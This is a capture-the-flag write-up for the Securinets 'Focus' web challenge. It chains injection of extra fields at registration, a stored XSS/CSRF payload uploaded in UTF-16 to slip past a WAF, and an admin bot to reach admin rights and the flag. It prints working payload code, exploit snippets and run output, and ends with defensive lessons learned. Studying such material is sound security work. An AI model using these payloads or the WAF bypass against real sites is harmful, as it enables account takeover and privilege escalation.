---
icon: vials
---

# Securinets Fianls 2k25

## Focus CTF Challenge - Solution Writeup

### Challenge Overview

* **Name**: Focus
* **Category**: Web
* **URL**: http://focus.securinets.tn

### Vulnerabilities Discovered

#### 1. SQL Injection in User Registration

**Location**: `/login` endpoint, `register` action

The application accepts arbitrary POST parameters during registration:

```python
user_data.update(request.form.to_dict())
user.create(user_data)
```

This allows injection of extra database columns like `accountage`:

```python
POST /login
username=hacker123&password=pass123&action=register&accountage=999
```

#### 2. Stored XSS via File Upload

**Location**: `/upload` endpoint

* Allows upload of various file extensions: `.png`, `.jpg`, `.pdf`, `.xlsx`, `.pdg`, `.bbx`, `.md`, `.xtf`, `.pfx`
* Files are served directly without Content-Type sanitization
* HTML/JavaScript in these files execute in browser when accessed

#### 3. CSRF in Admin Escalation

**Location**: `/change-role` endpoint

The admin-only endpoint can be triggered via CSRF:

```html
<form method=POST action=/change-role>
  <input name=username value=TARGET_USER>
</form>
<script>document.forms[0].submit()</script>
```

#### 4. Admin Bot for XSS Execution

**Location**: `/report` endpoint

* Allows reporting URLs to admin
* Admin bot visits URL while authenticated as admin
* Can trigger CSRF payload to elevate privileges

### WAF Bypass

The challenge includes a WAF that blocks malicious file content patterns:

```python
class WAF:
    def validate_content(self, data):
        # Blackbox patterns - not visible in source
        for pattern in self.malicious_patterns:
            if re.search(pattern, data, re.IGNORECASE):
                return True
        return False
```

#### Bypass Technique: UTF-16 Encoding

The WAF decodes uploaded files as UTF-8:

```python
content_str = content.decode('utf-8', errors='ignore')
```

**Solution**: Upload HTML/JavaScript encoded in UTF-16. The WAF's pattern matching fails because:

* UTF-16 encoded text looks like binary gibberish when decoded as UTF-8
* The browser correctly interprets UTF-16 when rendering the file

```python
payload = '<form>...</form><script>...'
files = {'file': ('exploit.pdg', payload.encode('utf-16'))}
```

### Exploit Chain

1. **SQL Injection**: Register user with `accountage=999` (bypasses the >30 days check)
2. **Login**: Authenticate as the new user
3. **Upload CSRF Payload**: Upload UTF-16 encoded HTML with role escalation CSRF
4. **Report to Admin**: Submit uploaded file URL to `/report` endpoint
5. **Admin Bot Execution**: Bot visits URL, executes CSRF, promotes user to admin
6. **Flag Retrieval**: Access `/get-flag` as admin with accountage > 30

### Flag Requirements

To get the flag from `/get-flag`:

* Must be logged in
* Must have role='admin'
* Must have accountage > 30

### Working Exploit

See `alternative_attack.py` for the complete working exploit using UTF-16 encoding bypass.

Key code snippet:

```python
# UTF-16 encoding to bypass WAF
payload = f'<form id=f method=POST action=/change-role><input name=username value={user}></form><img src=x onerror=f.submit()>'
encoded = payload.encode('utf-16')
s.post(f"{BASE_URL}/upload", files={'file': ('exploit.pdg', encoded)})
```

### Lessons Learned

1. **Character Encoding Attacks**: WAF pattern matching must account for various encodings
2. **Dynamic SQL**: Never use `request.form.to_dict()` directly in database operations
3. **CSRF Protection**: Critical admin functions need CSRF tokens
4. **Content-Type Headers**: Uploaded files should be served with `Content-Disposition: attachment`
5. **File Upload Validation**: Check content, not just extension

### Tools Used

* Python 3 + requests library
* Custom exploit scripts
* UTF-16 encoding for WAF bypass

```bash
> python alternative_attack.py

📋 User: usrT7A5G7wV18

[1] SQLi registration...
✅ Registered

[2] Login...
✅ Logged in

======================================================================
 WAF BYPASS ATTEMPTS
======================================================================

💡 Attempting null byte bypass...
  Trying: Null in filename
    ❌ Blocked
  Trying: Null in content prefix
    ❌ Blocked
  Trying: Null in content middle
    ❌ Blocked

💡 Attempting encoding bypasses...
  Trying: UTF-16
    ✅ Bypassed! Status: 200

✅ SUCCESS: Bypassed with .pdg at ts=1763394240

[3] Reporting to admin...

[4] Waiting 20s for admin bot...

[5] Getting flag...

======================================================================
🚩 Securinets{m1m3_sn1ff1ng_l34ds_t0_xss_pr1v_3sc}
======================================================================

```
